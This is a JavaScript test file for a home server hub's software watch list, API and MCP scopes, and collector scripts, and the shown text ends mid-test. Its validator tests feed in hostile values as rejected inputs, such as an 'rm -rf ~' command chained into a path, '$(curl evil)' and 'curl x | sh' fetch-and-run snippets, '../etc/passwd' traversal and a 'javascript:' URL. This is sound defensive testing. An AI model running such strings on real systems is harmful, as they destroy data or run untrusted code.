// Collectors and what they feed: the software watch list (validation, storage, HTTP API, MCP tools and
// scope), the four collector states, the collect scripts with a stubbed command runner (no test opens an
// SSH connection or touches another host), the router adapter contract, the launchd installer's print
// mode, the systemd examples, and English for every sentence the server builds.
import test from 'node:test';
import assert from 'node:assert/strict';
import {mkdtemp,mkdir,writeFile,readFile,rm,readdir,stat} from 'node:fs/promises';
import {readFileSync} from 'node:fs';
import {spawnSync} from 'node:child_process';
import os from 'node:os';
import path from 'node:path';
import {fileURLToPath} from 'node:url';
import {hub,SITE} from './hub-helper.mjs';
import {validateSite} from '../server/site-config.mjs';
import {legacyScopes,SCOPES} from '../server/scopes.mjs';
import {validateItem,checkWatch,createWatchStore,readWatch,formatWatch,itemHash,safePattern,isWatchError,watchPath,CMD_ARGS,WATCH_LIMITS} from '../server/software-watch.mjs';
import {systemsSpecs,buildSystems,parseSystemsProbe,systemsSetup} from '../server/systems-data.mjs';
import {collectorState,COLLECTORS,staleAfter} from '../server/collector-state.mjs';
import {buildSecurity,keyStrength,securitySetup,loadSecurity} from '../server/security-data.mjs';
import {normalizeRouter,readRouter,readRouterFor,routerAdapter,ROUTER_ADAPTERS,ROUTER_FILE} from '../server/router-data.mjs';
import {tx,sentences,fill,field} from '../server/text.mjs';
import {collectSystems,probeMachine,NOTHING_TO_PROBE} from '../scripts/collect-systems.mjs';
import {collectSecurity} from '../scripts/collect-security.mjs';

const root=path.resolve(path.dirname(fileURLToPath(import.meta.url)),'..');
const T='\t',rec=(...f)=>f.join(T);
const tmp=async t=>{const dir=await mkdtemp(path.join(os.tmpdir(),'hub-col-'));t.after(()=>rm(dir,{recursive:true,force:true,maxRetries:10,retryDelay:25}));return dir;};
const MACS=['mini','studio','mini_server'];
const node={id:'node',name:'Node.js',category:'infra',scheme:'node',upstream:{type:'node'},detect:{studio:{kind:'brew',formula:'node'},mini:{kind:'cmd',path:'~/.local/bin/node',args:'--version'}}};
const check=(item,options={})=>validateItem(item,{machines:MACS,categories:['infra','ai'],...options});
const with_=(change)=>{const copy=structuredClone(node);change(copy);return copy;};

test('watch list: a valid item of every detect kind and upstream type is accepted and normalized',()=>{
 assert.deepEqual(check(node),{item:node,errors:[]});
 const kinds={brew:{kind:'brew',formula:'whisper-cpp,whisper.cpp'},cask:{kind:'cask',cask:'claude'},app:{kind:'app',path:'/Applications/Some App.app'},
  cmd:{kind:'cmd',path:'~/tools/llama-b*/llama-server',args:'--version',match:'version: (\\S+)',launchd:'system/com.example.daemon',source:{label:'Built from source',url:null},inventory:['llama-server']},
  pydist:{kind:'pydist',glob:'~/venvs/app*/lib/python*/site-packages',package:'mlx-audio'},json:{kind:'json',path:'~/app/package.json',key:'version'}};
 for(const [kind,rule] of Object.entries(kinds))assert.deepEqual(check(with_(i=>{i.detect={mini:rule};})).errors,[],kind);
 const ups=[{type:'github',repo:'ggml-org/llama.cpp',tagPattern:'^v?\\d+\\.\\d+\\.\\d+$',tagPrefix:'v',allowPrerelease:false},{type:'codeberg',repo:'forgejo/forgejo'},{type:'pypi',package:'mlx-audio'},
  {type:'npm',package:'@scope/tool',tag:'latest'},{type:'brew-formula',name:'uv'},{type:'brew-cask',name:'claude'},{type:'node'},{type:'none',note:'No public feed.'}];
 for(const upstream of ups)assert.deepEqual(check(with_(i=>{i.upstream=upstream;})).errors,[],upstream.type);
 assert.deepEqual(check(with_(i=>{i.detect.mini.upstream={type:'brew-formula',name:'node'};})).item.detect.mini.upstream,{type:'brew-formula',name:'node'},'a machine may override the upstream');
});

test('watch list: a detect rule is data, never shell',()=>{
 const bad=(change,pattern,label)=>{const r=check(with_(change));assert.equal(r.item,null,label);assert.match(r.errors.join('\n'),pattern,label);};
 // Paths: no shell metacharacters, no traversal, absolute or under the home directory.
 for(const p of ['~/bin/x; rm -rf ~','/bin/sh -c "$(curl evil)"','~/bin/`id`','/bin/x|y',"~/bin/x'y",'~/../etc/passwd','relative/path','/bin/x\nreboot','$HOME/bin/x','/bin/x&','/bin/x>out'])
  bad(i=>{i.detect.mini.path=p;},/detect\.mini\.path must be an absolute path/,p);
 // cmd arguments: one of the fixed version flags, nothing else.
 for(const args of ['-c reboot','--version; id','','-e 1','--help',undefined,'--version --debug'])bad(i=>{i.detect.mini.args=args;},/args must be one of --version, -version, -v, -V, version/,String(args));
 for(const args of CMD_ARGS)assert.deepEqual(check(with_(i=>{i.detect.mini.args=args;})).errors,[],args);
 bad(i=>{i.detect.mini={kind:'shell',command:'id'};},/kind must be one of brew, cask, app, cmd, pydist, json/,'unknown kind');
 bad(i=>{i.detect.mini.command='id';},/unknown field\(s\) for kind cmd: command/,'unknown field');
 bad(i=>{i.detect.mini.launchd='x; launchctl remove y';},/launchd must be a launchd label/,'launchd label');
 bad(i=>{i.detect.studio.formula='node; brew upgrade';},/formula must be a formula name/,'formula');
 bad(i=>{i.detect.mini={kind:'json',path:'~/a.json',key:'a" b'};},/key must be a JSON field name/,'json key');
 bad(i=>{i.detect.mini={kind:'app',path:'/Applications/x'};},/ending in \.app/,'app path');
 bad(i=>{i.detect.mini.match='(a+)+$';},/match must be a simple regular expression/,'catastrophic regex');
 bad(i=>{i.detect.mini.source={label:'x',url:'javascript:alert(1)'};},/source\.url must be an http\(s\) URL or null/,'source url');
 // Machines, categories, ids and upstreams are checked against what exists.
 bad(i=>{i.detect.nas={kind:'brew',formula:'node'};},/detect\.nas: no machine "nas" with ssh\.probe "mac".*known: mini, studio, mini_server/,'a machine without the mac probe');
 bad(i=>{i.category='games';},/category "games" does not exist: pass categories/,'unknown category');
 bad(i=>{i.category='nas-apps';},/nas-apps and containers are reserved/,'reserved category');
 bad(i=>{i.id='Has Space';},/id must be 1-40 characters/,'id');
 bad(i=>{i.id='app:x';},/id must be 1-40 characters/,'the app: prefix belongs to discovered NAS apps');
 bad(i=>{i.upstream={type:'url',url:'https://example.com/latest'};},/upstream\.type must be one of github/,'unknown upstream type');
 bad(i=>{i.upstream={type:'github',repo:'../../x'};},/repo must be "owner\/name"/,'repo');
 bad(i=>{i.upstream={type:'github',repo:'a/b',token:'x'};},/unknown field\(s\) for type github: token/,'upstream field');
 bad(i=>{i.upstream={type:'thermo-feed',url:'https://internal.example.lan/stable.json'};},/thermo-feed upstreams are set in the file itself/,'a new fetched URL');
 bad(i=>{i.detect={};},/detect must map 1-50 machine ids/,'no machine');
 bad(i=>{i.extra=1;},/item has unknown field\(s\): extra/,'unknown item field');
 // An existing thermo-feed upstream may be kept as it is, but not pointed elsewhere.
 const feed={type:'thermo-feed',url:'https://updates.example.com/stable.json'},stored=with_(i=>{i.upstream=feed;});
 assert.deepEqual(check(stored,{previous:stored}).errors,[]);
 assert.match(check(with_(i=>{i.upstream={...feed,url:'https://other.example.com/x.json'};}),{previous:stored}).errors.join(),/thermo-feed/);
 assert.equal(safePattern('^v?\\d+\\.\\d+\\.\\d+$'),true);assert.equal(safePattern('x'.repeat(201)),false);assert.equal(safePattern('('),false);assert.equal(safePattern('(\\d+)\\1'),false);
});

test('collector: a cmd rule with other arguments never reaches the probe as a command',()=>{
 const reg={categories:{infra:'Servers'},items:[{id:'evil',name:'Evil',category:'infra',upstream:{type:'none'},detect:{mini:{kind:'cmd',path:'/bin/sh',args:'-c reboot'}}},node]};
 assert.equal(systemsSpecs(reg,'mini'),'evil|unsupported-args|||\nnode|cmd|~/.local/bin/node|--version|');
 // The probe answers an unknown kind with "unsupported"; the row then says why instead of "not found".
 const host={...parseSystemsProbe(['HOST\tmini\tDarwin\tu\t0\t2026-11-08T00:00:00Z',rec('SW','evil','unsupported','','unsupported-args'),'END\tok'].join('\n'))};
 const row=buildSystems({snapshot:{machines:{mini:host}},upstream:null,registry:reg,machines:[{id:'mini',name:'Mac mini',kind:'mac'}]}).software.find(r=>r.id==='evil');
 assert.equal(row.status,'unknown');assert.match(row.note,/jen přepínač verze/);assert.equal(row.installed,null);
 const src=readFileSync(path.join(root,'scripts','systems','mac-probe.sh'),'utf8');
 assert.match(src,/\*\) emit SW "\$id" unsupported "" "\$kind";;/,'the probe runs nothing for a kind it does not know');
});

test('watch store: create, replace with the hash, remove, categories; conflicts and invalid changes leave the file alone',async t=>{
 const dir=await tmp(t),file=path.join(dir,'local','software-watch.json');
 const store=createWatchStore({file,machines:()=>MACS});
 assert.deepEqual((await store.read()).registry.items,[],'no file: an empty list');assert.equal((await store.read()).source,'none');
 const rejects=async(change,code,pattern)=>{await assert.rejects(store.put(change),e=>{assert.ok(isWatchError(e));assert.equal(e.code,code);if(pattern)assert.match(e.details.join('\n'),pattern);return true;});};
 await rejects({item:node},'invalid',/category "infra" does not exist/);
 await assert.rejects(readFile(file),{code:'ENOENT'},'a refused change creates no file');
 const created=await store.put({item:node,categories:{infra:'Servers and infrastructure'}});
 assert.deepEqual({ok:created.ok,id:created.id,created:created.created,items:created.items},{ok:true,id:'node',created:true,items:1});assert.equal(created.hash,itemHash(node));
 const text=await readFile(file,'utf8');
 assert.equal(text.split('\n').filter(l=>l.startsWith('  {"id"')).length,1,'one item per line');assert.match(text,/"schemaVersion": 1/);assert.match(text,/"about": "Software this Home Hub watches/);
 assert.deepEqual(JSON.parse(text).items,[node]);
 await rejects({item:node},'conflict');await rejects({item:node,base:'0'.repeat(64)},'conflict');await rejects({item:{...node,id:'uv'},base:created.hash},'conflict');
 await rejects({item:node,base:'short'},'invalid',/base must be the 64-character hash/);await rejects({},'invalid',/nothing to change/);await rejects({item:node,remove:'node'},'invalid');await rejects({item:node,force:true},'invalid');
 const changed={...node,name:'Node'};
 const replaced=await store.put({item:changed,base:created.hash});assert.equal(replaced.created,false);assert.equal(replaced.hash,itemHash(changed));
 await rejects({item:node,base:created.hash},'conflict');
 await rejects({remove:'missing',base:created.hash},'not-found');await rejects({remove:'node',base:created.hash},'conflict');await rejects({remove:'node'},'conflict');
 await rejects({categories:{'nas-apps':'x'}},'invalid');await rejects({categories:{ok:''}},'invalid');
 assert.deepEqual((await store.put({categories:{ai:'AI runtimes'}})).categories,{infra:'Servers and infrastructure',ai:'AI runtimes'});
 // Writes are serialized: five creates at once all land.
 await Promise.all(['a','b','c','d','e'].map(id=>store.put({item:{...node,id}})));
 assert.deepEqual((await store.read()).registry.items.map(i=>i.id),['node','a','b','c','d','e']);
 const before=await readFile(file,'utf8');
 await rejects({item:with_(i=>{i.detect.mini.args='-c id';})},'invalid',/args must be one of/);
 assert.equal(await readFile(file,'utf8'),before,'an invalid change writes nothing');
 const gone=await store.put({remove:'node',base:replaced.hash});assert.deepEqual({removed:gone.removed,hash:gone.hash,items:gone.items},{removed:true,hash:null,items:5});
 assert.deepEqual((await readdir(path.dirname(file))),['software-watch.json'],'no temporary file is left');
});

test('watch store: limits; a hand-written list from before the API loads unchanged and keeps what the API does not know',async t=>{
 const dir=await tmp(t),file=path.join(dir,'software-watch.json');
 // The shape and layout of a list kept by hand: wrapped lines, an "about", a field of its own, a thermo-feed upstream.
 const old=`{\n "schemaVersion": 1,\n "about": "Mine.",\n "owner": "alice",\n "categories": {\n  "infra": "Servers"\n },\n "items": [\n  {"id": "thermo", "name": "Thermo", "category": "infra",\n   "upstream": {"type": "thermo-feed", "url": "https://updates.example.com/stable.json"},\n   "detect": {"mini": {"kind": "app", "path": "/Applications/Thermo.app", "launchd": "com.example.Thermo"}}}\n ]\n}\n`;
 await writeFile(file,old);
 const store=createWatchStore({file,machines:()=>MACS}),read=await store.read();
 assert.equal(read.source,'local');assert.equal(read.registry.items[0].upstream.type,'thermo-feed');assert.deepEqual(checkWatch(read.registry,{machines:MACS}),{errors:[],warnings:[]});
 const thermo=read.registry.items[0];
 await store.put({item:{...thermo,name:'Thermo app'},base:itemHash(thermo)});
 const after=JSON.parse(await readFile(file,'utf8'));
 assert.equal(after.about,'Mine.');assert.equal(after.owner,'alice','unknown top-level fields survive a write');assert.equal(after.items[0].name,'Thermo app');assert.equal(after.items[0].upstream.url,'https://updates.example.com/stable.json');
 assert.deepEqual(JSON.parse(formatWatch(after)),after,'the file format round-trips');
 // Limits: items and categories.
 const many={schemaVersion:1,categories:{infra:'Servers'},items:Array.from({length:WATCH_LIMITS.items},(_,i)=>({...node,id:`n${i}`}))};
 await writeFile(file,formatWatch(many));
 await assert.rejects(store.put({item:{...node,id:'one-more'}}),e=>e.code==='limit');
 await assert.rejects(store.put({categories:Object.fromEntries(Array.from({length:WATCH_LIMITS.categories},(_,i)=>[`c${i}`,'x']))}),e=>e.code==='limit');
 assert.equal(JSON.parse(await readFile(file,'utf8')).items.length,WATCH_LIMITS.items);
 await writeFile(file,'{ not json');await assert.rejects(store.read(),/is not valid JSON/);
 await writeFile(file,'[]');await assert.rejects(store.read(),/must be an object with an items list/);
});

test('the list lives beside the site configuration; a hub without a site overlay has none and says so',async t=>{
 assert.equal(watchPath({},'/srv/hub'),path.join('/srv/hub','local','software-watch.json'));
 assert.equal(watchPath({HOME_HUB_SITE_CONFIG:'/etc/hub/site.json'},'/srv/hub'),path.join('/etc/hub','software-watch.json'),'another site file brings its own list');
 assert.equal(watchPath({SOFTWARE_WATCH_FILE:'/tmp/w.json',HOME_HUB_SITE_CONFIG:'none'},'/srv/hub'),'/tmp/w.json');
 assert.equal(watchPath({HOME_HUB_SITE_CONFIG:'none'},'/srv/hub'),null);
 const store=createWatchStore({file:null,machines:()=>MACS});
 assert.deepEqual(await store.read(),{source:'none',file:null,registry:{schemaVersion:1,categories:{},items:[]}});
 await assert.rejects(store.put({item:node,categories:{infra:'Servers'}}),e=>isWatchError(e)&&e.code==='unavailable');
});

test('shipped example list passes the same validation the API applies',async()=>{
 const {registry,source}=await readWatch({file:path.join(root,'config','software-watch.json')});
 assert.equal(source,'local');assert.ok(registry.items.length>5);
 assert.deepEqual(checkWatch(registry,{machines:MACS}),{errors:[],warnings:[]});
 const lost=checkWatch(registry,{machines:['other']});assert.deepEqual(lost.errors,[]);assert.ok(lost.warnings.length>0,'machines the site does not have are warnings, not errors');
 assert.match(checkWatch({items:[node,node]},{machines:MACS}).errors.join(),/node: duplicate id/);
});

const post=(h,url,body,headers)=>h.post(url,body,headers);
test('/api/software-watch: admins and keys with software:write only; create, conflict, invalid, remove; feeds /api/systems',async t=>{
 const dir=await tmp(t),file=path.join(dir,'software-watch.json');
 const h=await hub(t,{softwareWatchFile:file});
 assert.equal((await fetch(h.origin+'/api/software-watch')).status,401);
 assert.equal((await fetch(h.origin+'/api/software-watch',{method:'POST',headers:{'Content-Type':'application/json',Origin:h.origin},body:'{}'})).status,401);
 assert.ok(SCOPES['software:write']&&!SCOPES['software:write'].readOnly);
 assert.ok(!legacyScopes('write').includes('software:write'),'old read/write keys never get the new scope');
 const reader=await h.account('reader',[]),writer=await h.account('inventory-agent',['inventory:write']),agent=await h.account('watch-agent',['software:write']);
 for(const key of [reader,writer]){
  const r=await fetch(h.origin+'/api/software-watch',{headers:key.headers});assert.equal(r.status,403);assert.equal((await r.json()).error.code,'SCOPE_REQUIRED');
  assert.equal((await fetch(h.origin+'/api/software-watch',{method:'POST',headers:{...key.headers,'Content-Type':'application/json'},body:JSON.stringify({item:node})})).status,403);
 }
 const empty=await (await fetch(h.origin+'/api/software-watch',{headers:h.admin})).json();
 assert.equal(empty.source,'none');assert.deepEqual(empty.items,[]);assert.deepEqual(empty.machines.map(m=>m.id),MACS,'machines a rule may name: the ones probed as macOS');
 assert.deepEqual(empty.cmdArgs,[...CMD_ARGS]);assert.ok(!empty.upstreamTypes.includes('thermo-feed'));assert.equal(empty.file,'software-watch.json');
 const made=await post(h,'/api/software-watch',{item:node,categories:{infra:'Servers'}},h.admin);assert.equal(made.status,201);
 const {hash}=await made.json();assert.match(hash,/^[a-f0-9]{64}$/);
 const listed=await (await fetch(h.origin+'/api/software-watch',{headers:agent.headers})).json();
 assert.equal(listed.source,'local');assert.equal(listed.items[0].hash,hash);assert.deepEqual(listed.categories,{infra:'Servers'});
 const again=await post(h,'/api/software-watch',{item:node},h.admin);assert.equal(again.status,409);assert.equal((await again.json()).error.code,'SOFTWARE_WATCH_CONFLICT');
 const bad=await post(h,'/api/software-watch',{item:with_(i=>{i.detect.mini.args='-c id';}),base:hash},agent.headers);
 assert.equal(bad.status,422);const err=(await bad.json()).error;assert.equal(err.code,'SOFTWARE_WATCH_INVALID');assert.match(err.details.join(),/args must be one of/);
 assert.equal((await post(h,'/api/software-watch',{remove:'nope',base:hash},h.admin)).status,404);
 assert.equal((await post(h,'/api/software-watch',[1],h.admin)).status,422);
 // A viewer's session is refused like on the other admin pages.
 const user=await (await post(h,'/api/admin/users',{username:'vera'},h.admin)).json();
 const login=await post(h,'/api/session',{username:'vera',password:user.initialPassword});const viewer={Cookie:login.headers.get('set-cookie').split(';')[0]};
 assert.equal((await fetch(h.origin+'/api/software-watch',{headers:viewer})).status,403);assert.equal((await post(h,'/api/software-watch',{item:node,base:hash},viewer)).status,403);
 // The versions payload reads the same file: a probed install of the watched item becomes a row.
 await mkdir(path.join(h.dir,'systems'),{recursive:true});
 const host={...parseSystemsProbe('HOST\tstudio\tDarwin\tu\t0\t2026-11-08T00:00:00Z\nEND\tok'),software:{node:[{kind:'brew',value:'26.1.0',detail:'node',extra:''}]}};
 await writeFile(path.join(h.dir,'systems','snapshot.json'),JSON.stringify({collectedAt:'2026-11-08T00:00:00Z',machines:{studio:host}}));
 const systems=await (await fetch(h.origin+'/api/systems',{headers:h.admin})).json();
 assert.equal(systems.software.find(r=>r.id==='node'&&r.machine==='studio').installed,'26.1.0');assert.deepEqual(systems.collector.watch,{source:'local',items:1});
 const removed=await post(h,'/api/software-watch',{remove:'node',base:hash},agent.headers);assert.equal(removed.status,200);assert.equal((await removed.json()).items,0);
});

const rpc=(h,headers,method,params)=>fetch(h.origin+'/mcp',{method:'POST',headers:{'Content-Type':'application/json',Accept:'application/json, text/event-stream',...headers},body:JSON.stringify({jsonrpc:'2.0',id:1,method,...(params?{params}:{})})});
const call=async(h,headers,name,args)=>(await (await rpc(h,headers,'tools/call',{name,arguments:args})).json()).result;
test('MCP: software_watch_list and software_watch_put are listed for software:write only, validate like the API and report refusals',async t=>{
 const dir=await tmp(t),file=path.join(dir,'software-watch.json');
 const h=await hub(t,{softwareWatchFile:file});
 const agent=await h.account('watch-agent',['software:write']),reader=await h.account('reader',['security:read']);
 const names=async headers=>(await (await rpc(h,headers,'tools/list')).json()).result.tools.map(x=>x.name);
 assert.ok((await names(agent.headers)).includes('software_watch_list')&&(await names(agent.headers)).includes('software_watch_put'));
 assert.ok(!(await names(reader.headers)).some(n=>n.startsWith('software_watch')));
 const tools=(await (await rpc(h,agent.headers,'tools/list')).json()).result.tools,put=tools.find(x=>x.name==='software_watch_put');
 assert.equal(put.inputSchema.additionalProperties,false);assert.deepEqual(put.inputSchema.properties.item.properties.detect.additionalProperties.properties.args.enum,[...CMD_ARGS]);
 const denied=await call(h,reader.headers,'software_watch_put',{item:node});assert.equal(denied.isError,true);assert.match(denied.content[0].text,/lacks the "software:write" scope/);
 const list=await call(h,agent.headers,'software_watch_list',{});assert.equal(list.isError,false);assert.equal(list.structuredContent.source,'none');assert.deepEqual(list.structuredContent.machines.map(m=>m.id),MACS);
 const made=await call(h,agent.headers,'software_watch_put',{item:node,categories:{infra:'Servers'}});
 assert.equal(made.isError,false);assert.equal(made.structuredContent.created,true);assert.equal(made.structuredContent.file,'software-watch.json');
 const hash=(await call(h,agent.headers,'software_watch_list',{})).structuredContent.items[0].hash;assert.equal(hash,made.structuredContent.hash);
 const shell=await call(h,agent.headers,'software_watch_put',{item:with_(i=>{i.id='sh';i.detect={mini:{kind:'cmd',path:'/bin/sh',args:'-c "curl x | sh"'}};})});
 assert.equal(shell.isError,true);assert.match(shell.content[0].text,/rejected as invalid.*args must be one of/);
 const stale=await call(h,agent.headers,'software_watch_put',{item:{...node,name:'N'},base:'f'.repeat(64)});assert.equal(stale.isError,true);assert.match(stale.content[0].text,/changed since you read it/);
 const removed=await call(h,agent.headers,'software_watch_put',{remove:'node',base:hash});assert.equal(removed.structuredContent.removed,true);
 assert.deepEqual(JSON.parse(await readFile(file,'utf8')).items,[]);
});

test('collector states: not configured, waiting, ok, stale; the intervals are the scheduled jobs\' intervals',()=>{
 const now=Date.parse('2026-11-08T12:00:00Z'),at=h=>new Date(now-h*3600e3).toISOString();
 assert.deepEqual(collectorState('systems',{configured:false,now}),{state:'not-configured',configured:false,collectedAt:null,ageSeconds:null,intervalSeconds:21600,staleAfterSeconds:27000,script:'scripts/collect-systems.mjs'});
 assert.equal(collectorState('systems',{configured:true,now}).state,'waiting');
 assert.equal(collectorState('systems',{configured:true,collectedAt:at(7),now}).state,'ok','a quarter over the interval is allowed for the run itself');
 const stale=collectorState('systems',{configured:true,collectedAt:at(8),now});assert.equal(stale.state,'stale');assert.equal(stale.ageSeconds,8*3600);
 assert.equal(collectorState('systems',{configured:false,collectedAt:at(1),now}).state,'ok','a snapshot is shown even when the site no longer lists machines');
 assert.equal(collectorState('security',{configured:true,collectedAt:at(31),now}).state,'stale');assert.equal(collectorState('upstream',{configured:true,collectedAt:at(14),now}).state,'ok');
 assert.equal(collectorState('systems',{configured:true,collectedAt:'garbage',now}).state,'waiting');
 assert.equal(staleAfter(COLLECTORS.router),180,'SPEC: an observation older than 3 minutes is stale');
 assert.equal(systemsSetup(validateSite({})).state,'not-configured');assert.equal(systemsSetup(SITE).state,'waiting');assert.deepEqual(systemsSetup(SITE).machines.map(m=>m.id),['mini','studio','mini_server','nas']);
 assert.equal(securitySetup(validateSite({machines:[{id:'box',ssh:{alias:'box',keys:false}}]})).state,'not-configured','ssh.keys:false leaves a machine out of the key inventory');
 assert.equal(securitySetup(SITE,{collectedAt:at(2),now}).state,'ok');
});

const macProbe=[rec('HOST','mini','Darwin','alice','1','2026-11-08T12:00:00Z'),rec('OS','macOS','26.7.1','25G241','25.6.0','arm64'),rec('HW','Macmini9,1','Apple M1','17179869184','8'),
 rec('SWU_NONE'),rec('FW','global','1'),rec('FV','FileVault is Off.'),rec('SIP','System Integrity Protection status: enabled.'),rec('GK','assessments enabled'),
 rec('PF','Enabled','12'),rec('SSHD','remotelogin','on'),rec('SSHD','PasswordAuthentication','yes'),rec('SSHD','AllowUsers','alice@10.0.0.151'),rec('SHARE','com.apple.screensharing','loaded'),
 rec('LISTEN','launchd','root','*:22'),rec('SW','node','brew','26.1.0','node',''),rec('END','ok')].join('\n');
const nasProbe=[rec('HOST','nas','Linux','svc','1','2026-11-08T12:00:00Z'),rec('OS','TrueNAS','25.10.7','Debian 12','6.12','x86_64'),
 rec('TNUPDATE','NORMAL','train','MISSION_CRITICAL','25.10.8','2026-11-03','Fixes CVE-1.'),rec('APP','immich','RUNNING','1.0','v1','true','false','false','community','immich'),
 rec('SERVICE','ftp','RUNNING','true'),rec('FTP','21','false','false','true'),rec('SSHD','passwordauthentication','no'),rec('NFT','none','0',''),rec('LISTEN','smbd','root','0.0.0.0:445'),rec('END','ok')].join('\n');

test('/api/systems and /api/security: the answer says where the collector stands, with and without a snapshot; older snapshot shapes load',async t=>{
 const bare=await hub(t,{site:validateSite({siteName:'Empty'}),softwareWatchFile:path.join(await tmp(t),'none.json')});
 const none=await fetch(bare.origin+'/api/systems',{headers:bare.admin});assert.equal(none.status,404);
 const body=await none.json();assert.equal(body.error.code,'SYSTEMS_MISSING');assert.equal(body.collector.state,'not-configured');assert.deepEqual(body.collector.machines,[]);
 const noKeys=await (await fetch(bare.origin+'/api/security',{headers:bare.admin})).json();assert.equal(noKeys.error.code,'SECURITY_MISSING');assert.equal(noKeys.collector.state,'not-configured');
 const h=await hub(t,{softwareWatchFile:path.join(await tmp(t),'none.json')});
 const waiting=await (await fetch(h.origin+'/api/systems',{headers:h.admin})).json();assert.equal(waiting.collector.state,'waiting');assert.equal(waiting.collector.machines.length,4);
 assert.equal((await (await fetch(h.origin+'/api/security',{headers:h.admin})).json()).collector.state,'waiting');
 // A snapshot as the collector wrote it before any of this existed (no intervals, no parts): every field the
 // clients knew is still there, and the new ones are additions.
 await mkdir(path.join(h.dir,'systems'),{recursive:true});
 const fresh=new Date(Date.now()-3600e3).toISOString();
 await writeFile(path.join(h.dir,'systems','snapshot.json'),JSON.stringify({schemaVersion:1,collectedAt:fresh,collectedFrom:'studio',machines:{mini:{...parseSystemsProbe(macProbe),alias:'mini',stale:false,lastError:null},nas:{...parseSystemsProbe(nasProbe),nft:{inputPolicies:[{policy:'none',chains:1}],rules:0,tables:[]}}}}));
 const doc=await (await fetch(h.origin+'/api/systems',{headers:h.admin})).json();
 for(const key of ['schemaVersion','generatedAt','collectedAt','oldestCollectedAt','collectedFrom','upstreamCheckedAt','upstreamFailed','categories','machines','software'])assert.ok(key in doc,key);
 assert.equal(doc.collector.state,'ok');assert.equal(doc.collector.upstream.state,'not-configured');assert.equal(doc.collectedAt,fresh);
 const mini=doc.machines.find(m=>m.id==='mini'),nas=doc.machines.find(m=>m.id==='nas');
 for(const key of ['id','name','kind','reachable','stale','error','collectedAt','hw','uptimeSeconds','os','checks','listening','brewOutdated','summary'])assert.ok(key in mini,key);
 assert.deepEqual(Object.keys(mini.checks[0]).slice(0,5),['id','label','state','value','detail']);
 assert.equal(mini.checks.find(c=>c.id==='filevault').state,'crit');assert.equal(nas.checks.find(c=>c.id==='firewall').value,'vstup nefiltrován','the old "none" policy is still read as unfiltered');
 // The Czech sentence clients always got, and its parts for other languages.
 const pf=mini.checks.find(c=>c.id==='pf');assert.equal(pf.value,'zapnutý · 12 pravidel');assert.deepEqual(pf.valueT,[{key:'zapnutý · {rules} pravidel',params:{rules:12}}]);
 const exposed=mini.checks.find(c=>c.id==='exposed');assert.equal(exposed.value,'1 portů');assert.deepEqual(exposed.valueT,[{key:'Portů: {n}',params:{n:1}}]);
 assert.deepEqual(mini.checks.find(c=>c.id==='sharing').valueT[0].params.items,['Sdílení obrazovky']);
 assert.equal(nas.checks.find(c=>c.id==='ftp').detail,'Port 21 na všech rozhraních, jen místní účty.');
 // Stale: the same snapshot nine hours later.
 const old=new Date(Date.now()-9*3600e3).toISOString();
 await writeFile(path.join(h.dir,'systems','snapshot.json'),JSON.stringify({schemaVersion:1,collectedAt:old,machines:{mini:parseSystemsProbe(macProbe)}}));
 assert.equal((await (await fetch(h.origin+'/api/systems',{headers:h.admin})).json()).collector.state,'stale');
 // The key inventory: a document without the newer fields is served as it is, plus its collector state.
 await mkdir(path.join(h.dir,'security'),{recursive:true});
 const legacy={schemaVersion:1,collectedAt:'2026-01-01T00:00:00.000Z',collectedFrom:'studio',machines:[],keys:[],otherKeys:[],unknownAuthorized:[],forgejo:null,findings:[{level:'info',title:'x: nikam nevede',detail:'y'}]};
 await writeFile(path.join(h.dir,'security','ssh-keys.json'),JSON.stringify(legacy));
 const keys=await (await fetch(h.origin+'/api/security',{headers:h.admin})).json();
 assert.deepEqual({...keys,collector:undefined,provenance:undefined},{...legacy,collector:undefined,provenance:undefined});assert.equal(keys.collector.state,'stale');assert.equal(keys.collector.intervalSeconds,86400);
 assert.deepEqual(await loadSecurity(h.dir),legacy);
});

// A stand-in for the command runner: records every command and answers from a table, so no test opens a connection.
function fakeExec(answers){
 const calls=[];
 const exec=async(cmd,argv)=>{calls.push([cmd,...argv]);
  if(cmd==='hostname')return {code:0,stdout:'collector\n',stderr:''};
  const alias=cmd==='ssh'?argv[argv.length-2]:'local',answer=answers[alias];
  return typeof answer==='string'?{code:0,stdout:answer+'\n',stderr:''}:{code:255,stdout:'',stderr:answer?.error||`ssh: connect to host ${alias} port 22: Operation timed out`};};
 return {exec,calls};
}
test('collect-systems with a stubbed runner: probes over ssh or locally, writes the snapshot, keeps an unreachable machine\'s last record as stale',async t=>{
 const outDir=path.join(await tmp(t),'systems'),registry={categories:{infra:'Servers'},items:[node]};
 const first=fakeExec({mini:macProbe.replace('\tmini\t','\tmini\t'),local:macProbe.replace('HOST\tmini','HOST\tstudio'),'nas-admin':nasProbe});
 const r1=await collectSystems({site:SITE,registry,outDir,exec:first.exec,now:()=>'2026-11-08T12:00:00.000Z'});
 // What was run: one probe per machine with an ssh entry, each through its alias; nothing else.
 const ssh=first.calls.filter(c=>c[0]==='ssh'),local=first.calls.filter(c=>c[0]==='/bin/sh');
 assert.deepEqual(ssh.map(c=>c.at(-2)).sort(),['mini','mini_server','nas-admin']);assert.equal(local.length,1,'alias "local" runs on this machine');
 assert.deepEqual(first.calls.map(c=>c[0]).sort(),['/bin/sh','hostname','ssh','ssh','ssh']);
 for(const c of ssh){assert.deepEqual(c.slice(1,5),['-n','-o','BatchMode=yes','-o']);assert.match(c.at(-1),/^sh -c "\$\(printf %s [A-Za-z0-9+/=]+ \| base64 -d\)" systems-probe$/,'the remote command is the encoded probe and nothing else');}
 const sent=Buffer.from(/printf %s (\S+)/.exec(ssh.find(c=>c.at(-2)==='mini').at(-1))[1],'base64').toString();
 assert.ok(sent.startsWith("SPECS='node|cmd|~/.local/bin/node|--version|'\n#!/bin/sh"),'the watch list reaches the probe as data lines');
 assert.ok(local[0][2].startsWith("SPECS='node|brew|node||'\n"));
 assert.equal(r1.snapshot.collectedFrom,'collector');assert.equal(r1.snapshot.collectedAt,'2026-11-08T12:00:00.000Z');
 assert.equal(r1.snapshot.machines.mini.complete,true);assert.equal(r1.snapshot.machines.mini.alias,'mini');
 assert.equal(r1.snapshot.machines.mini_server.complete,false);assert.match(r1.snapshot.machines.mini_server.lastError,/Operation timed out/);
 assert.equal(r1.doc.machines.find(m=>m.id==='nas').os.status,'update');assert.equal(r1.doc.software.find(x=>x.id==='node'&&x.machine==='mini').installed,'26.1.0');
 assert.deepEqual(JSON.parse(await readFile(r1.file,'utf8')),r1.snapshot);assert.equal((await stat(r1.file)).mode&0o777,0o600);
